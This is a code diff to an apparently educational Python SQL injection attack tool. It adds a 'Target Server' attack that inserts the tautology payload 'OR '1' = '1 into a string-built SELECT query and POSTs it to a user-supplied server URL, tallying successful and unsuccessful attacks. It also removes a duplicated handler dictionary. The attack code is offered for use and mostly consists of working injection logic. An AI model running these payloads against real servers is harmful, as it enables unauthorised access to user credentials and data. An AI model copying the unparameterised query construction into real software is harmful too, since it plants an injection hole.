@@ -47,10 +47,10 @@ Notes:
   - This program is for educational purposes only and should not be used for malicious purposes.
   - Ensure the database file exists and is accessible before running attacks.
 """
-
 import sqlite3
 import os
 import platform
+import requests  # For making HTTP requests to target servers
 
 class SQLInjectionAttacks:
     def __init__(self):
@@ -61,6 +61,11 @@ class SQLInjectionAttacks:
             1: {
                 "function": self.get_user_credentials,
                 "sqli_name": "Extract User Credentials",
+                "default_query": "'OR '1' = '1"  # Default query for this attack
+            },
+            2: {
+                "function": self.target_server,
+                "sqli_name": "Target Server (e.g., Docker)",
                 "default_query": "'OR '1' = '1"  # Default query for this attack
             }
             # Add more attacks here as needed
@@ -83,13 +88,6 @@ class SQLInjectionAttacks:
             # Add other database connection functions here as needed
             # Example: "mysql": mysql.connector.connect,
             # Example: "postgresql": psycopg2.connect,
-        }
-
-        # Initialize handler dispatch dictionary
-        self.handlers = {
-            '1': lambda: self.get_handle_query('default'),
-            '2': lambda: self.get_handle_query('manual'),
-            '3': lambda: self.get_handle_query('predefined')
         }
 
         # Initialize handler dispatch dictionary
@@ -242,6 +240,36 @@ class SQLInjectionAttacks:
             self.unsuccessful_attacks += 1  # Increment unsuccessful attacks counter
 
         return probe_result
+
+    def target_server(self, query, db_connection, db_cursor):
+        """
+        Simulates an SQL injection attack against a server (e.g., Docker container).
+        This method sends a malicious query to a server running a database service.
+        """
+        # Prompt the user for the server URL (e.g., http://localhost:8080)
+        server_url = input("Enter the server URL (e.g., http://localhost:8080): ").strip()
+        if not server_url:
+            print("No server URL provided. Returning to main menu.")
+            return None
+
+        # Construct the malicious query
+        malicious_query = f"SELECT * FROM users WHERE username = '{query}'"
+        print(f"Sending malicious query to server: {malicious_query}")
+
+        try:
+            # Simulate sending the query to the server (e.g., via HTTP POST)
+            response = requests.post(server_url, data={"query": malicious_query})
+            if response.status_code == 200:
+                print(self.prompt_extraction_success)
+                self.successful_attacks += 1  # Increment successful attacks counter
+                return response.json()  # Assuming the server returns JSON data
+            else:
+                print(self.prompt_extraction_failure)
+                self.unsuccessful_attacks += 1  # Increment unsuccessful attacks counter
+                return None
+        except Exception as e:
+            print(f"Server error: {e}")
+            return None
 
     def print_centered(self, text):
         """
